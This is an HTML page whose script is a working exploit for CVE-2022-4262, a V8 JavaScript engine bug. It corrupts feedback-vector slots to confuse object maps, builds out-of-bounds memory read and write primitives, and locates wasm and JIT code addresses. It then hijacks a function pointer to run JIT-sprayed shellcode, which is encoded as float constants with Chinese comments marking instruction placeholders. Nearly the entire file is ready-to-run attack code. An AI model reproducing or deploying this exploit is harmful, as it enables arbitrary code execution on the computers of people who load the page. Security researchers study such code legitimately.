<script>
    // Exploit for CVE-2022-4262
// author: @mistymntncop
// based on the ITW exploit (author unknown) found by @_clem1
//
// Build d8 using:
// a) Run once
//    git checkout 18865d6af0404f2d2aeb1c99dd73503364ce0967
//    gclient sync
//
//    If you want to DebugPrint the feedback vector apply the patch with
//    (make sure you are in the root V8 folder):
//    git apply C:\path\to\patch\dbg.patch
//
//    You can revert the patch with:
//    git apply -R C:\path\to\patch\dbg.patch    
//
// b) Run per each compilation
//
//    Debug Build:
//    py ./tools/dev/gm.py x64.debug
//
//    Release Build:
//    py ./tools/dev/gm.py x64.release
//
// Run:
// C:\path\to\v8\d8.exe --allow-natives-syntax exploit.js
//
// if this does not work for you try the "bytecode-old-age" flag.
// C:\path\to\v8\d8.exe --allow-natives-syntax --bytecode-old-age=3 exploit.js

var conv_ab = new ArrayBuffer(8);
var conv_f64 = new Float64Array(conv_ab);
var conv_b64 = new BigInt64Array(conv_ab);

function f2i(f) {
    conv_f64[0] = f;
    return conv_b64[0];
}

function i2f(i) {
    conv_b64[0] = i;
    return conv_f64[0];
}

function ptr(addr) {
    return addr | 1n;
}
function unptr(addr) {
    return addr & ~3n;
}

function smi(i) {
    return i << 1n;
}
function unsmi(i) {
    return i >> 1n;
}

function hex(i){
  return "0x"+i.toString(16).padStart(16,"0");
}

const foo = ()=>
  {
      return [
          1.0,
          1.97128800932264e-246,
          1.9710251538487089e-246,//占位1 20
  1.9535165331756856e-246,
  1.9711831786218553e-246,
  1.9711302582276649e-246,//mov rdx,rdx+60h，这一行后面加一个mov rdx,rdx+18h
  1.971182386370243e-246,//增加完毕
  1.9711824204694007e-246,//替换qword from dword
  1.971182625597146e-246,
  1.9711062190503973e-246,
  1.9844872658808452e-246,
  1.9710442338776101e-246,//占位2 200
  1.9346517240445797e-246,
  1.9539187092919419e-246,//占位3 240
  1.9398291100944961e-246,
  1.9889043320213015e-246,
  5.4347192807448249e-232,//需要更换跳转到+3的位置 300
  5.5483866078232455e-232,//test rax, rax 占位4 323
  5.4347193054904659e-232,
  5.5483858407041602e-232,
  5.548386599938718e-232,
  5.5483852580972086e-232,
  5.5483866085489296e-232,
  5.5483866082450352e-232,//占位5替换指令 test   rcx,rcx 461
  5.4347192989761578e-232,
  5.5483866082673696e-232,
  5.5483865052825693e-232,
  5.5929115874408499e-232,
  5.5483869437399541e-232,
  5.5483850365737534e-232,
  5.548386607845941e-232,
  5.5483866055903481e-232,//占位6替换指令：622 cmp al,ah
  5.5483866055790415e-232,
  5.5479675990708206e-232,
  5.5483866086060441e-232,//占位7：691
  5.6360051602057723e-232,
  5.5483866055757255e-232,
  5.5483853060875066e-232,
  5.5485814548559491e-232,
  5.5481638823537202e-232,
  5.5483852101069105e-232,
  5.5483873667057662e-232,
  5.548386503033024e-232,
  5.5482136635123504e-232,
  5.5482200888855405e-232,
  5.5056845587187283e-232,
  5.4993936985335533e-232,
  5.5057579849776769e-232,
  5.5483865996697425e-232,
  5.5487288654373309e-232,//占位8 1059
  5.548387392950241e-232,
  5.5483866079393109e-232,
  5.5479425928198922e-232,// lea     rcx,[rbp+0x57a]
  5.5483866055757276e-232,
  5.5479429440804607e-232,
  5.5412087282453567e-232,
  5.5483866055884766e-232,
  5.5482086832973947e-232,
  5.5587464282218089e-232,
  5.4667737614685567e-232,
  5.5483856568047451e-232,//占位9 1289
  5.5480699333653622e-232,//占位10 
  5.5482848842675359e-232,
  5.6065483607039769e-232,
  5.5483866088298074e-232,//mov movsxd替换 1381
  9.5545979395580963e-307
      ];
  }
  for (let i = 0; i < 0x10000; i++) {
      foo();foo();foo();foo();
  }
  const f_x = () => 123;

const FIXED_ARRAY_HEADER_SIZE = 8n;
var large_arr = new Array(0x10000);
large_arr.fill(i2f(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
var packed_map = null;
var packed_double_map = null;
var packed_double_props = null;
var fake_arr_elements_addr = null;
var fake_arr = null;

// function fake_obj(addr) {
//     large_arr[0] = i2f(packed_map | (packed_double_props << 32n));
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(1n) << 32n));
//     large_arr[3] = i2f(ptr(addr));
    
//     let result = fake_arr[0];
    
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
//     return result;
// }


// function addr_of(obj) {
//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(1n) << 32n));
    
//     fake_arr[0] = obj;
//     let result = f2i(large_arr[3]) & 0xFFFFFFFFn;
    
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 
    
//     return result;
// }

// function v8_read64(addr) {
//     addr -= FIXED_ARRAY_HEADER_SIZE;
    
//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
//     large_arr[1] = i2f(ptr(addr) | (smi(1n) << 32n));
    
//     let result = f2i(fake_arr[0]);
    
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n)); 

//     return result;    
// }

// function v8_write64(addr, val) {
//     addr -= FIXED_ARRAY_HEADER_SIZE;
    
//     large_arr[0] = i2f(packed_double_map | (packed_double_props << 32n));
//     large_arr[1] = i2f(ptr(addr) | (smi(1n) << 32n));
    
//     fake_arr[0] = i2f(val);
    
//     large_arr[1] = i2f(fake_arr_elements_addr | (smi(0n) << 32n));   
// }

function gc_minor() { //scavenge
    for(let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function gc_major() { //mark-sweep
    new ArrayBuffer(0x7fe00000);
}

//https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/18865d6af0404f2d2aeb1c99dd73503364ce0967:src/flags/flag-definitions.h;l=1444
function flush_bytecode() {
    try {
        //please change to be the "bytecode_old_age" value from ./src/flags/flag-definitions.h
        //you can observe if this is working by passing the "--trace-gc" flag
        const bytecode_old_age = 5;
        for(let i = 0; i < (bytecode_old_age+1); i++) {
            gc_major();
        }
    } catch(err) {
        print(err);
    }
}

function make_small() {
    let result = {};
    result.p1 = 1;
    return result;
}

function make_big() {
    //These are all inline properties. If we make a smaller object have the 
    //same MAP as this then we will be able to access out of bounds.
    let result = {
        p1: 1, p2: 2, p3: 3, p4: 4, p5: 5, p6: 6, p7: 7, p8: 8, p9: 9, p10: 10, 
        p11: 11, p12: 12, p13: 13, p14: 14, p15: 15, p16: 16, p17: 17, p18: 18
    };
    //We need to add the extra property to transition to a new MAP with a cleared
    //validity cell. Also, the extra field is external and captures the write so
    //that doesn't interfere with our inline properties.
    result.extra = 1;
    return result;
}
var ballast = null;
var small_obj = make_small();
var big_obj = make_big();
var corrupted_obj = null;
var arr1 = null;
var arr2 = null;
//%GlobalPrint("small ==========================\n");
//%Debugprint(small_obj);
//%GlobalPrint("big ==========================\n");
//%Debugprint(big_obj);

//We use the SetNamedProperty instruction to cause memory corruption. This instruction 
//uses the SetNamedStrict feedback vector slots.
//In this example, before we trigger GC the first SetNamedStrict is at slot #4. After GC it 
//is at slot #8. This slot now points to controlled feedback. Specifically, the
//first SetNamedStrict slot #8 contains the corrupted_obj MAP (small_obj MAP) and the
//second SetNamedStrict slot #9 contains the MAP we want to transition to (big_obj MAP).
//
//Generated Interpreter (/interpreter/interpreter-generator.cc):
//  IGNITION_HANDLER(SetNamedProperty, InterpreterSetNamedPropertyAssembler) ->
//  SetNamedProperty ->
//      CallStub(Builtins::CallableFor(isolate(), Builtin::kStoreIC), ...)
//
//Generated Builtin (/builtins/builtins-ic-gen.cc):
//  Builtins::Generate_StoreIC ->
//Generated Builtin (/ic/accessor-assembler.cc):
//  AccessorAssembler::GenerateStoreIC ->
//  AccessorAssembler::StoreIC ->
//  AccessorAssembler::HandleStoreICHandlerCase ->
//        BIND(&store_transition_or_global) ->
//        BIND(&store_transition) ->
//  AccessorAssembler::HandleStoreICTransitionMapHandlerCase ->
//  AccessorAssembler::OverwriteExistingFastDataProperty ->
//        BIND(&if_field) ->
//        BIND(&backing_store) -> 
//  CodeStubAssembler::StoreMap

//First 10 iterations of the loop installs the feedback vector and seeds it with feedback.
//The 11th iteration triggers the vuln and changes the MAP of corrupted_obj.
for(let i = 0; i < 11; i++) {
    //%GlobalPrint(i + " ===============================\n");
    //this prevents bad results from LoadGlobalNotInsideTypeof slots from crashing the exploit
    function dummy() { return true; }
    
    //use locals here instead of globals because otherwise it would create extra slots in the feedback vector
    let target = {}; //placeholder - this is the object we want to change the MAP of.
    let SetNamedStrict_slot1 = {}; //this gets transitioned to "small_obj" MAP once we add property p1
    let LoadProperty_slot0 = big_obj; //this is the MAP we want to transition to.
    if(i == 10) {
        //%GlobalPrint("GC ==========================\n");
        //this causes the bytecode to be thrown away
        flush_bytecode();
        //allocate all the objects after GC so that they are allocated in NewSpace
        corrupted_obj = make_small();
        target = corrupted_obj;
        arr1 = [1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310,1.85419992257717e-310]; //0x0000222200002222        
        arr2 = [large_arr,2,3,4,5,6,7,8];
    }

    //This will cause corrupted_obj (small_obj MAP) to transition to a big_obj MAP
    //Unfortunately because of the nature of the vulnerability we cant put this in it's own function :-(
    ((a = class Clazz {
       [(dummy(
            eval(),
            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            eval, //consumes 2 feedback slots (LoadGlobalNotInsideTypeof) upon reparse
            target.p1 = 123, //this is where the target SetNamedStrict slot will be
            [], //this Literal (AllocationSite) uses one feedback slot. This is important. Slot value has to be a valid pointer!
            SetNamedStrict_slot1.p1 = 1, //small_obj MAP will be in the second SetNamedStrict slot
            LoadProperty_slot0.p1 //big_obj MAP will be in the first LoadProperty slot
        )
        ? 0 : (ballast = 1)) //this crap is to make sure the slot length of the feedback vector and feedback metadata are equal
       ]
    }) => {})();
}
//*
//%Debugprint(corrupted_obj);
corrupted_obj.p18 = 0x1000; //modify length of arr1 array
var obj_dict = {mark:0xdead,mark1:0x1337,obj:{}};
var foo_arr = [1.1,2.2,3.3,4.4];
var obj_idx = 76;
function addr_of(obj) {
    obj_dict.obj = obj;
    return f2i(arr1[76]) & 0xffffffffn;
}


var element_idx = 101;
function v8_read64(addr){
    arr1[element_idx] = i2f((0x8n << 32n) + ((addr-0x8n) | 0x1n));
    return (f2i(foo_arr[0]));
}
function v8_write64(addr,val){
    arr1[element_idx] = i2f((0x8n << 32n) + ((addr-0x8n) | 0x1n));
    foo_arr[0] = i2f(val);
}
// %DebugPrint(arr1);
// %DebugPrint(obj_dict);
// %DebugPrint(foo_arr);
// let foo_arr_addr = addr_of(foo_arr);
// let double_map = v8_read64(foo_arr_addr);
// alert("[+]foo_arr_addr : " + hex(foo_arr_addr));
// alert("[+]double_map : " + hex(double_map));

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
var buf1 = new ArrayBuffer(0x200);
var dataview1 = new DataView(buf1);
let instance_addr = addr_of(wasmInstance);
      // %DebugPrint(buf1);
console.log("[+]wasm instance addr : " + hex(instance_addr));
let rwx_addr = v8_read64(instance_addr-1n+0x60n);
console.log("[+]rwx addr : " + hex(rwx_addr));
let buf_addr = addr_of(buf1);
console.log("[+]buf_addr : " + hex(buf_addr));
var foo_addr = addr_of(foo);

console.log("[+]foo addr :" + hex(foo_addr));
var code_addr = v8_read64(foo_addr+0x18n) & 0xffffffffn;
console.log("[+]code addr : " + hex(code_addr));
// // %SystemBreak();

var jit_addr = v8_read64(code_addr+0x7n);
console.log("[+]jit code addr : " + hex(jit_addr));
var f_x_addr = addr_of(f_x);
console.log("[+]f_x_addr : " + hex(f_x_addr));
var f_x_code_addr = v8_read64(f_x_addr+0x18n) & 0xffffffffn;
console.log("[+]f_x_code_addr : " + hex(f_x_code_addr));
v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
// %DebugPrint(f_x);
alert("target : " + hex(jit_addr+0xb3n+0x6n));
f_x();
//%GlobalPrint("large arr ======================\n");
//%Debugprint(large_arr);
//%GlobalPrint("arr1 ===========================\n");
//%Debugprint(arr1);
//%GlobalPrint("arr2 ===========================\n");
//%Debugprint(arr2);
//%GlobalPrint("small_obj_addr = " + small_obj_addr.toString(16) + "\n");
//%GlobalPrint("small_obj_map_and_props = " + small_obj_map_and_props.toString(16) + "\n");
//%GlobalPrint("corrupted_obj_addr = " + corrupted_obj_addr.toString(16) + "\n");


//%GlobalPrint("large_arr_addr = " + large_arr_addr.toString(16) + "\n");
//%GlobalPrint("fixed_arr_map = " + fixed_arr_map.toString(16) + "\n");
//%GlobalPrint("packed_double_elements = " + packed_double_elements.toString(16) + "\n");
//%GlobalPrint("large_arr_elements_addr = " + large_arr_elements_addr.toString(16) + "\n");
//%GlobalPrint("fake_arr_addr = " + fake_arr_addr.toString(16) + "\n");

////%Debugprint(fake_arr);
//*/

</script>
